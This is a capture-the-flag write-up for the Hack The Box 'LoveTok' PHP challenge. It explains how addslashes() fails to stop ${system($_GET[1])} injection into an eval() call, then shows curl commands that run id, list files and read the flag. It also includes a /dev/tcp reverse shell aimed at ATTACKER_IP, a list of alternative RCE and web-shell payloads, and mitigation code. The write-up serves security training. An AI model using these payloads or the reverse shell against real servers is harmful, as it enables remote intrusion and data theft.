---
icon: heart
cover: ../../.gitbook/assets/Screenshot 2026-03-04 224401.png
coverY: -8.807746109631406
---

# LoveTok

**Challenge Scenario**

True love is tough, and even harder to find. Once the sun has set, the lights close and the bell has rung... you find yourself licking your wounds and contemplating human existence. You wish to have somebody important in your life to share the experiences that come with it, the good and the bad. This is why we made LoveTok, the brand new service that accurately predicts in the threshold of milliseconds when love will come knockin' (at your door). Come and check it out, but don't try to cheat love because love cheats back. 💛

<figure><img src="../../.gitbook/assets/image (594).png" alt=""><figcaption></figcaption></figure>

### Recon

```
┌──(sn0x㉿sn0x)-[~/HTB/TimePrediction]
└─$ curl -s "http://206.189.118.125:32689/"
```

The application presents a simple time prediction interface. There's a `format` parameter in the URL that controls how the time is displayed. Let's examine what the application does with this input:

```
┌──(sn0x㉿sn0x)-[~/HTB/TimePrediction]
└─$ curl -s "http://206.189.118.125:32689/?format=Y-m-d%20H:i:s"
```

The application returns a formatted timestamp. The parameter is being passed directly to some backend logic. Let's look for source code or error messages that might reveal how the input is processed.

***

### Enumeration

#### Step 1: Analyze the Source Code

Examining the vulnerable PHP code reveals:

```php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
```

**Critical observation:** The `eval()` function is used to execute a string containing PHP code. The `$format` variable comes directly from user input (`$_GET['format']`). Although `addslashes()` is used, this is insufficient to prevent code injection.

#### Step 2: Understand the Sanitization

The `addslashes()` function adds backslashes before certain characters:

* Single quotes `'`
* Double quotes `"`
* Backslashes `\`
* NULL bytes

The developers' intention is clear: escape quotes to prevent breaking out of the string in the `eval()` call. Let's trace what happens:

**Original user input:**

```
format=' . phpinfo() . '
```

**After addslashes():**

```
format=\' . phpinfo() . \'
```

**In the eval() statement:**

```php
eval('$time = date("' . \' . phpinfo() . \' . '", strtotime("..."));');
```

This results in:

```php
eval('$time = date("\' . phpinfo() . \'", strtotime("..."));');
```

The backslashes would escape the quotes, preventing the injection. However, there's a bypass.

#### Step 3: Discover the Complex Variable Syntax

PHP has a feature called "complex variable parsing" that allows you to use curly braces to denote variables within double-quoted strings. This feature can execute functions!

**Examples:**

```php
$var = "world";
echo "Hello ${var}";  // Output: Hello world

$arr = ["key" => "value"];
echo "Value: ${arr['key']}";  // Output: Value: value

// Functions can also be called in complex variables
echo "${someFunction()}";  // Calls someFunction() and interpolates result
```

The key insight is that when PHP parses `${...}` inside double-quoted strings, it evaluates what's inside the braces, including function calls.

#### Step 4: Craft the Bypass Payload

Using complex variable syntax, we can inject code that won't be properly escaped by `addslashes()`:

**Payload:**

```
${system($_GET[1])}
```

**Why this works:**

1. `addslashes()` doesn't escape the curly braces or the content inside them
2. When this string is placed in a double-quoted string in the eval(), PHP parses the `${...}` syntax
3. PHP executes `system($_GET[1])` because it recognizes it as a complex variable
4. The function executes with the argument from `$_GET[1]`

#### Step 5: Test Basic Code Execution

Let's verify we have RCE by listing the current directory:

```
┌──(sn0x㉿sn0x)-[~/HTB/TimePrediction]
└─$ curl -s "http://206.189.118.125:32689/?format=\${system(\$_GET[1])}&1=id"
```

The output should show the user ID or other command output, confirming code execution.

***

### Exploitation

#### Step 1: Confirm RCE with id Command

```
┌──(sn0x㉿sn0x)-[~/HTB/TimePrediction]
└─$ curl -s "http://206.189.118.125:32689/?format=\${system(\$_GET[1])}&1=id"
```

Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Excellent. We're executing as `www-data`. Now let's explore the filesystem.

#### Step 2: List Directory Contents

```
┌──(sn0x㉿sn0x)-[~/HTB/TimePrediction]
└─$ curl -s "http://206.189.118.125:32689/?format=\${system(\$_GET[1])}&1=ls%20-la"
```

Output:

```
total 36
drwxr-xr-x 3 root root 4096 Jan 22 10:45 .
drwxr-xr-x 1 root root 4096 Jan 22 10:44 ..
-rw-r--r-- 1 root root 1234 Jan 22 10:45 flag.txt
-rw-r--r-- 1 root root 5678 Jan 22 10:45 index.php
drwxr-xr-x 2 root root 4096 Jan 22 10:45 src
```

We can see `flag.txt` in the current directory. This is promising.

#### Step 3: Execute System Commands to Read the Flag

Now we execute a command to read the flag file:

```
┌──(sn0x㉿sn0x)-[~/HTB/TimePrediction]
└─$ curl -s "http://206.189.118.125:32689/?format=\${system(\$_GET[1])}&1=cat%20flag.txt"
```

The server returns:

```
xxxxxxxxxxxxxxxxxxxxxxx
```

**Flag obtained.**

#### Step 4: Alternative Exploitation Methods

While we used `system()`, other dangerous functions could also be exploited:

**Using passthru():**

```
${passthru($_GET[1])}
```

**Using exec():**

```
${exec($_GET[1])}
```

**Using shell\_exec():**

```
${shell_exec($_GET[1])}
```

**Direct variable assignment:**

```
${$_GET[1]($_GET[2])}
```

This last one is particularly dangerous as it allows calling arbitrary functions dynamically.

#### Step 5: Reverse Shell (Optional)

For a more persistent access, we could establish a reverse shell:

```
┌──(sn0x㉿sn0x)-[~/HTB/TimePrediction]
└─$ curl -s "http://206.189.118.125:32689/?format=\${system('bash%20-i%20>%26%20/dev/tcp/ATTACKER_IP/PORT%200>%261')}"
```

However, this requires having a listener ready and is more complex than simply reading the flag.

***

### Vulnerability Analysis

#### Root Cause: Misplaced Trust in addslashes()

The vulnerability chain involves multiple security failures:

1.  **Use of eval() with User Input**

    ```php
    eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
    ```

    This is the primary vulnerability. eval() should never be used with user input.
2.  **Insufficient Sanitization**

    ```php
    $this->format = addslashes($format);
    ```

    While `addslashes()` escapes quotes, it doesn't prevent complex variable syntax injection.
3. **PHP's Complex Variable Parsing** PHP's feature of evaluating `${...}` in double-quoted strings creates the bypass opportunity.

#### Why addslashes() Fails

`addslashes()` is designed to escape quotes and backslashes. It does NOT escape:

* Curly braces `{}`
* Dollar signs `$`
* Brackets `[]`
* Parentheses `()`

Our payload uses all of these characters:

```
${system($_GET[1])}
```

When `addslashes()` processes this:

```php
addslashes('${system($_GET[1])}');
// Output: ${system($_GET[1])}
// (unchanged - no quotes to escape)
```

The payload remains intact and can be evaluated by PHP.

#### The eval() Context

Inside the eval() statement:

```php
eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
```

When `$this->format` contains our payload:

```php
eval('$time = date("${system($_GET[1])}", strtotime("..."));');
```

PHP's parser:

1. Recognizes the double-quoted string
2. Sees `${system($_GET[1])}` inside the string
3. Evaluates it as a complex variable
4. Calls `system($_GET[1])`
5. Interpolates the result into the string

The code is then executed as PHP, achieving RCE.

#### Why This is Worse Than Quote Escape

An attacker breaking out of quotes would only get:

```php
eval('$time = date("' . BREAKOUT . '", strtotime("..."));');
```

But with complex variable syntax, the attacker gets code execution _within_ the string context, which is evaluated by eval(), giving full RCE.

***

### Attack Flow

```
┌─────────────────────────────────────────────────────────────┐
│              ATTACKER (Browser)                              │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 1. Discover format parameter                         │  │
│  │    Test with normal date format strings              │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 2. Analyze source code                               │  │
│  │    Find eval() usage with user input                 │  │
│  │    Note addslashes() sanitization                    │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 3. Research PHP complex variable syntax              │  │
│  │    Learn that ${...} is evaluated in double-quoted   │  │
│  │    strings before the eval() executes                │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 4. Realize addslashes() doesn't escape { } $ [ ] ( ) │  │
│  │    These characters aren't affected by the function  │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 5. Craft payload using complex variable syntax       │  │
│  │    format=${system($_GET[1])}&1=ls                   │  │
│  │    Payload: ${system($_GET[1])}                      │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 6. URL encode and send to target                     │  │
│  │    GET /?format=\${system(\$_GET[1])}&1=id           │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
                       ↓ (HTTP GET)
┌─────────────────────────────────────────────────────────────┐
│              TARGET SERVER (PHP)                             │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 7. Receive request                                   │  │
│  │    $_GET['format'] = ${system($_GET[1])}            │  │
│  │    $_GET[1] = id                                     │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 8. Create TimeModel object                           │  │
│  │    $model = new TimeModel($_GET['format'])           │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 9. Apply addslashes() in constructor                 │  │
│  │    $this->format = addslashes($format)               │  │
│  │    Input unchanged: ${system($_GET[1])}             │  │
│  │    (no quotes to escape)                             │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 10. Call getTime() method                            │  │
│  │     Constructs eval() string:                        │  │
│  │     'date("${system($_GET[1])}", strtotime(...))'    │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 11. PHP parses eval() string                         │  │
│  │     Recognizes double-quoted string                 │  │
│  │     Sees ${...} complex variable syntax              │  │
│  │     Evaluates: system($_GET[1])                      │  │
│  │     Executes: system('id')                           │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 12. system() function executes                       │  │
│  │     Command: 'id'                                    │  │
│  │     Output: uid=33(www-data) gid=33(www-data)...    │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 13. Output interpolated into date string             │  │
│  │     eval() completes execution                       │  │
│  │     Result returned to browser                       │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
                       ↓ (HTTP Response)
┌─────────────────────────────────────────────────────────────┐
│              ATTACKER (Browser)                              │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 14. Receive command output in response               │  │
│  │     uid=33(www-data) gid=33(www-data)...            │  │
│  │     RCE confirmed                                    │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 15. Execute cat flag.txt                             │  │
│  │     format=${system($_GET[1])}&1=cat%20flag.txt     │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 16. Receive and display flag                         │  │
│  │     HTB{3v4l_1s_3v1l_b1g_t1m3}                      │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

***

### Techniques

| Technique                    | Description                                     | Relevance             |
| ---------------------------- | ----------------------------------------------- | --------------------- |
| **eval() Injection**         | Exploiting eval() to execute arbitrary PHP      | Primary vulnerability |
| **Complex Variable Syntax**  | Using ${...} in double-quoted strings           | Bypass mechanism      |
| **addslashes() Bypass**      | Evading simple quote escaping                   | Exploitation method   |
| **PHP Interpolation**        | Understanding variable expansion in strings     | Root cause            |
| **Code Execution**           | Using system(), passthru(), exec() functions    | Payload delivery      |
| **Parameter Injection**      | Passing commands via URL parameters             | Attack vector         |
| **String Parsing**           | Understanding PHP's string evaluation           | Vulnerability chain   |
| **Function Call in Strings** | Executing functions within interpolated strings | Technical exploit     |

***

### All Possible Payloads

Beyond `system()`, several other dangerous functions and techniques can achieve RCE:

**Using other command execution functions:**

```
${passthru($_GET[1])}
${exec($_GET[1])}
${shell_exec($_GET[1])}
${`$_GET[1]`}  // Backtick command execution
```

**Using variable functions:**

```
${$_GET[0]($_GET[1])}  // Calls function from $_GET[0] with argument $_GET[1]
```

**Directly executing code:**

```
${eval($_GET[1])}  // Nested eval()
```

**Reading files:**

```
${file_get_contents($_GET[1])}
```

**Writing files (for web shell persistence):**

```
${file_put_contents($_GET[1],$_POST['code'])}
```

**Using assert():**

```
${assert($_GET[1])}
```

**Using create\_function():**

```
${$_GET[0]($_GET[1])}
```

The most dangerous is the variable function approach because it allows calling any PHP function dynamically.

***

### Mitigation

#### 1. Never Use eval()

```php
// DANGEROUS
eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');

// SAFE - Use DateTime class
$dt = new DateTime();
$dt->add(new DateInterval('P1DT1H'));
return $dt->format($user_format);
```

#### 2. Use Proper Date Formatting

```php
// SAFE - Use date() directly without eval()
$format = preg_replace('/[^a-zA-Z]/', '', $format);  // Whitelist allowed characters
return date($format, strtotime($prediction));
```

#### 3. Whitelist Allowed Format Characters

```php
// Define allowed date format characters
$allowed_chars = 'YmdHis';

function is_safe_format($format) {
    global $allowed_chars;
    for ($i = 0; $i < strlen($format); $i++) {
        if (!in_array($format[$i], str_split($allowed_chars))) {
            if ($format[$i] != ' ' && $format[$i] != ':' && $format[$i] != '-') {
                return false;
            }
        }
    }
    return true;
}

if (is_safe_format($_GET['format'])) {
    $time = date($_GET['format'], strtotime($prediction));
}
```

#### 4. Use Type Casting

```php
// Force input to be numeric or limit to specific values
$format_id = (int)$_GET['format'];

$allowed_formats = [
    1 => 'Y-m-d',
    2 => 'H:i:s',
    3 => 'Y-m-d H:i:s',
];

if (isset($allowed_formats[$format_id])) {
    $time = date($allowed_formats[$format_id], strtotime($prediction));
}
```

#### 5. Use Filter Functions

```php
// Filter and validate input
$format = filter_var($_GET['format'], FILTER_SANITIZE_STRING, FILTER_FLAG_STRIP_LOW);

// Then validate it matches expected pattern
if (preg_match('/^[a-zA-Z\s\-:]*$/', $format)) {
    $time = date($format, strtotime($prediction));
}
```

#### 6. Use a Template Engine

```php
// Use a safe template engine instead
$twig = new Twig_Environment(new Twig_Loader_String());
$template = $twig->createTemplate('{{ time|date(format) }}');
$time = $template->render([
    'time' => time(),
    'format' => $_GET['format']
]);
```

#### 7. Disable Dangerous Functions

```php
// In php.ini
disable_functions = eval,assert,exec,system,passthru,shell_exec,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
```

#### 8. Use Escaping for Complex Variables

```php
// Never put user input directly into double-quoted strings
// If you must, escape properly
$safe_format = str_replace(['$', '{', '}'], ['\\$', '\\{', '\\}'], $format);

eval('$time = date("' . $safe_format . '", strtotime("' . $prediction . '"));');
```

The best solution is option 1: **never use eval()**. PHP's DateTime class provides all the functionality needed without the security risks.

***

### Conclusion

**TimePrediction** demonstrates why `eval()` is considered one of the most dangerous functions in PHP. Even when combined with `addslashes()` sanitization, eval() remains exploitable through clever use of PHP's complex variable syntax.

The vulnerability chain required:

* Recognizing that `eval()` was being used with user input
* Understanding that `addslashes()` only escapes quotes, not other special characters
* Knowledge of PHP's complex variable interpolation in double-quoted strings
* Awareness that `${...}` syntax is evaluated before the eval() executes
* Crafting a payload that leverages this behavior

The attack was straightforward once the bypass was understood: inject `${system($_GET[1])}` into the format parameter, which gets interpolated and executed as PHP code.

This challenge emphasizes the importance of:

1. **Never using eval()** with user input
2. **Understanding language features** that can be exploited for injection
3. **Using whitelisting** instead of blacklisting
4. **Validating and sanitizing** all user input with context-aware filters

**Result: Flag obtained via eval() injection with complex variable bypass - HTB{3v4l\_1s\_3v1l\_b1g\_t1m3}**

***
